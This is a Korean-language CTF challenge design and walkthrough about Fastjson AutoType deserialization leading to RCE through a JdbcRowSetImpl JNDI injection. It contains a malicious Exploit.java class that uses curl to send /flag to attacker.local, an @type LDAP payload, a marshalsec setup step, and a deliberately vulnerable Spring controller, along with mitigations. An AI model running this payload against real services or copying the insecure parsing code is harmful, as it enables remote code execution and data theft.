---
title: Java Fastjson Deserialization to RCE — Web CTF Scenario
created: 2026-06-14
updated: 2026-06-14
type: ctf-scenario
tags: [ctf, web, java, fastjson, deserialization, rce, jndi-injection]
confidence: high
---

# Java Fastjson Deserialization to RCE — Web CTF Scenario

## 1. 개요 및 스토리
- **문제명**: Enterprise JSON Parser (엔터프라이즈 JSON 데이터 가공소)
- **난이도**: High
- **핵심 컨셉**: Java Spring 웹 프레임워크 환경에서 외부 입력 JSON 데이터를 고속 처리하기 위해 연동한 **Fastjson** 라이브러리의 다형성(Polymorphism) 역직렬화 명세 결함을 이용한 **원격 코드 실행(RCE)** 취약점 문제입니다. 대상 애플리케이션은 사용자가 업로드한 커스텀 모델 설정을 Fastjson 라이브러리로 파싱합니다. Fastjson은 JSON 내부에 클래스 타입을 직접 지정할 수 있는 자동 유형 판단 속성인 **`@type`**을 지원합니다. 공격자는 이 자동 파싱 모듈의 필터링 미흡(Autotype 활성화 오작동)을 이용하여, 내부 자바 클래스 로더를 교란하는 JDND 가젯(`com.sun.rowset.JdbcRowSetImpl`)을 주입하고, LDAP/RMI 원격 클래스 로딩을 트리거하여 샌드박스 없는 원격 명령 실행에 성공합니다.

---

## 2. 문제 설계 및 구조 (Architecture)

### 2.1 구성 요소
- **JSON Processing Service**:
  - POST 요청으로 넘어온 JSON 본문을 `JSON.parseObject(jsonStr)` 메소드로 디시리얼라이즈하는 스프링 백엔드 API 엔드포인트.
- **Attacker LDAP/HTTP Server**:
  - 공격자가 셋업한 LDAP 참조 서비스 및 악성 컴파일 Java class 파일(`Exploit.class`)을 호스팅하는 웹 서버.
- **Flag 위치**:
  - 서버 파일 시스템 루트 경로 `/flag` 파일로 존재하며 RCE 획득 후 탈취해야 합니다.

### 2.2 취약점 지점
1. **Unsafe Fastjson AutoType Enabled (오픈 오토타입 설정)**:
   - 개발진은 복잡한 객체 상속 구조의 JSON 처리를 위해 `ParserConfig.getGlobalInstance().setAutoTypeSupport(true)` 옵션을 활성화했습니다.
   - 이로 인해 검증되지 않은 위험한 임의의 Java 클래스가 데이터 파싱 도중 초기화 및 메모리 할당(Instantiation)되는 상황이 벌어집니다.
2. **JdbcRowSetImpl Gadget Abuse (JNDI Injection)**:
   - JDK 내부 빌트인 클래스인 `com.sun.rowset.JdbcRowSetImpl`은 속성 중 `dataSourceName`에 JNDI 연결 문자열을 받고, `autoCommit` 속성이 참으로 지정될 때 내부적으로 데이터베이스 커넥션 풀 초기화를 시도하며 `InitialContext.lookup(dataSourceName)` 함수를 실행합니다.
   - 공격자는 JNDI 주소값을 자신의 악성 LDAP 주소(`ldap://attacker.local:1389/Exploit`)로 포인팅하여, LDAP 서버가 반환하는 가짜 자바 클래스를 런타임에 다운로드 및 컴파일 구동시킵니다.

---

## 3. 공격 면 (Attack Surface)

| 엔드포인트 | 메소드 | 인증 | 파라미터/바디 | JSON 라이브러리 사양 | 목표 |
|------------|--------|------|---------------|----------------------|------|
| `/api/parse` | POST | 불필요 | JSON Body | Fastjson (Autotype 지원) | `@type` 속성을 통한 JNDI RCE 실행 |

---

## 4. 상세 풀이 흐름 (Exploitation Flow)

### Step 1. Fastjson 사용 여부 식별
1. 임의의 JSON 포맷이 깨진 형태를 보내 백엔드의 디버그 에러 로그 유형을 관찰합니다.
2. 예외 메시지에 `com.alibaba.fastjson.JSONException` 이 노출되거나, JSON 전송 속도가 매우 빠르고 자바 환경임을 짐작할 때 Fastjson 계열이 쓰이고 있음을 감지합니다.

### Step 2. 공격자 원격 LDAP 헬퍼 및 익스플로잇 클래스 빌드
1. 공격자는 윈도우/리눅스 명령어 실행용 바디를 생성하는 자바 코드를 컴파일하여 `.class` 파일로 빌드하고 웹 서버에 저장합니다.
   - **악성 Java 클래스 소스 (`Exploit.java`)**:
     ```java
     public class Exploit {
         static {
             try {
                 // OS 명령어 실행 (OOB flag 전송)
                 Runtime.getRuntime().exec("bash -c 'curl http://attacker.local/log?c=$(cat /flag)'");
             } catch (Exception e) {}
         }
     }
     ```
2. JNDI 참조를 받아줄 악성 LDAP 레퍼런스 포트(예: 1389)를 리서치 도구(예: `marshalsec` 유틸리티)를 기동해 셋업하고, 요청 수신 시 `http://attacker.local/Exploit.class` 주소를 인계하도록 매핑합니다.

### Step 3. @type JNDI 주입 페이로드 전송
1. 타겟 `/api/parse` API로 `JdbcRowSetImpl` 가젯과 악성 LDAP URL이 바인딩된 JSON 데이터를 발송합니다.
   - **요청 Body 예시**:
     ```json
     {
       "parameter": {
         "@type": "com.sun.rowset.JdbcRowSetImpl",
         "dataSourceName": "ldap://attacker.local:1389/Exploit",
         "autoCommit": true
       }
     }
     ```
2. Fastjson 엔진은 `@type` 키를 만나 `com.sun.rowset.JdbcRowSetImpl` 클래스를 동적으로 생성하고, 연달아 지정된 `dataSourceName` 및 `autoCommit` 세터(Setter) 메소드를 구동합니다.

### Step 4. flag 획득
1. 세터 실행에 의해 자바 가상머신(JVM)이 JNDI 룩업을 시도하며 `ldap://attacker.local:1389/Exploit` 주소로 쿼리를 날립니다.
2. 공격자의 LDAP 프록시가 `Exploit.class` 주소를 응답으로 인계하고, 타겟 서버의 JVM은 해당 원격 바이트코드를 메모리에 로드해 static 이니셜라이저 블록을 실행합니다.
3. RCE가 동작하여 공격자 웹로그에 최종 플래그 데이터(`FLAG{fastjson_autotype_jndi_deserialization_rce}`)가 송출됩니다.

---

## 5. 취약점 유발 백엔드 코드 스니펫 (Java Spring)

```java
// JSONController.java (취약한 Fastjson 파싱 컨트롤러 예시)
package com.challenge.controller;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RestController;

@RestController
public class JSONController {

    static {
        // 취약점 지점 1: 임의의 외부 클래스 동적 역직렬화를 허용하는 AutoTypeSupport 옵션 활성화
        // 이로 인해 공격자가 지정한 @type 클래스가 메모리 내에 가동됨
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
    }

    @PostMapping("/api/parse")
    public String parseJSON(@RequestBody String jsonStr) {
        try {
            // 취약점 지점 2: 들어온 JSON 문자열을 타입 제한 없이 Object로 역직렬화 처리
            // JSON 내에 @type 필드가 존재하면 지정한 자바 클래스 필드 세터들이 자동 구동됨
            Object parsedObj = JSON.parseObject(jsonStr);
            return "{\"status\":\"success\", \"type\":\"" + parsedObj.getClass().getName() + "\"}";
        } catch (Exception e) {
            return "{\"status\":\"error\", \"message\":\"" + e.getMessage() + "\"}";
        }
    }
}
```

---

## 6. 방어 및 완화 기법 (Mitigation)

1. **AutoType 기능 비활성화 (Disable AutoType)**:
   - Fastjson 구동 시 `autoTypeSupport` 옵션을 반드시 `false`로 지정하여 런타임에 임의 클래스가 주입 및 기동되는 통로를 사전에 완전 봉쇄합니다.
2. **세이프 모드 강제 적용 (Fastjson SafeMode)**:
   - Fastjson 최신 버전에서 지원하는 SafeMode 설정을 명시적으로 기동하여 `@type` 파싱 기능 자체를 애플리케이션 전역에서 강제 거부 처리합니다.
     ```java
     ParserConfig.getGlobalInstance().setSafeMode(true);
     ```
3. **최신 버전 라이브러리 업데이트 및 Jackson/Gson 대체**:
   - 지속해서 JNDI 바이패스 취약점이 보고되는 Fastjson 대신, 다형성 클래스 로딩 방어가 비교적 견고하고 안전 사양이 확보된 최신 버전의 Jackson-databind 또는 Gson 라이브러리로 대체 연동할 것을 권장합니다.
